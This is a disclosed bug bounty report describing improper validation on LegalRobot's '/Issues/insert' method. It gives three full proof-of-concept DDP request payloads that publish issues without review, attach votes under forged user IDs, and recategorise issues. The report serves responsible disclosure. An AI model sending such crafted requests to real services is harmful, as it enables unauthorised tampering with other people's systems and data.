# Improper validation of parameters while creating issues

## Report Details
- **Report ID**: 260632
- **URL**: https://hackerone.com/reports/260632
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-08-16T07:14:51.882Z
- **Disclosed**: 2017-08-16T07:45:25.542Z

## Reporter
- **Username**: samczsun
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: legalrobot

## Vulnerability Information
Heya LegalRobot Team,

There is some Improper Access Control on the `/Issues/insert` endpoint, which leads to three notable vulnerabilities.

-----

The first allows attackers to create public issues without undergoing review by setting `state: "Open"` and `public: true`. A sample request is given below:

```
>>> ["{\"msg\":\"method\",\"method\":\"/Issues/insert\",\"params\":[{\"name\":\"test2\",\"description\":\"testing2\",\"state\":\"Open\",\"type\":\"feature\",\"createdBy\":\"8kPzAttw8qghnCKxo\",\"public\":true,\"createdAt\":{\"$date\":1502786634092}}],\"id\":\"23\",\"randomSeed\":\"2c4ade5b34f282b86f46\"}"]
<<< a["{\"msg\":\"result\",\"id\":\"23\"}"]
<<< a["{\"msg\":\"updated\",\"methods\":[\"23\"]}"]
```
Notice that going to https://app.legalrobot-uat.com/roadmap while logged out shows the open ticket.

-----

The second allows attackers to create issues with votes already attached simply by populating the `votes` parameter to an array of arbitrary IDs. A sample request is given below:

```
>>> ["{\"msg\":\"method\",\"method\":\"/Issues/insert\",\"params\":[{\"name\":\"test3\",\"description\":\"testing3\",\"state\":\"New\",\"type\":\"feature\",\"createdBy\":\"8kPzAttw8qghnCKxo\",\"votes\":[\"8kPzAttw8qghnCKxo\",\"8kPzAttw8qghnCKxp\",\"8kPzAttw8qghnCKxq\",\"8kPzAttw8qghnCKxr\",\"8kPzAttw8qghnCKxs\"], \"public\":false,\"createdAt\":{\"$date\":1502786634092}}],\"id\":\"23\",\"randomSeed\":\"2c4adf5b34f282d86f46\"}"]
<<< a["{\"msg\":\"result\",\"id\":\"23\"}"]
<<< a["{\"msg\":\"updated\",\"methods\":[\"23\"]}"]
```

If you check the issue with ID `fbwsw3WrdGyFsEtea`, you'll see that it has 5 votes already attached to it, despite being under review. A screenshot of the outcome is also attached.

-----

The third allows attackers to re-categorize their own issues by modifying the `type` field. For example, by setting `type: "bug"`, an issue under `Known Issues` is generated. A sample request is given below:

```
>>> ["{\"msg\":\"method\",\"method\":\"/Issues/insert\",\"params\":[{\"name\":\"test3\",\"description\":\"testing3\",\"state\":\"somestatehere\",\"type\":\"bug\",\"createdBy\":\"8kPzAttw8qghnCKxo\",\"votes\":[\"8kPzAttw8qghnCKxo\",\"8kPzAttw8qghnCKxp\",\"8kPzAttw8qghnCKxq\",\"8kPzAttw8qghnCKxr\",\"8kPzAttw8qghnCKxs\"], \"public\":false,\"createdAt\":{\"$date\":1502786634092}}],\"id\":\"23\",\"randomSeed\":\"2c4adf5b35g282d86f46\"}"]
<<< a["{\"msg\":\"result\",\"id\":\"23\"}"]
<<< a["{\"msg\":\"updated\",\"methods\":[\"23\"]}"]
```
A screenshot of the outcome is attached

## Attachments
- f65fb566d8_1_.png
- 5545dc5820_1_.png
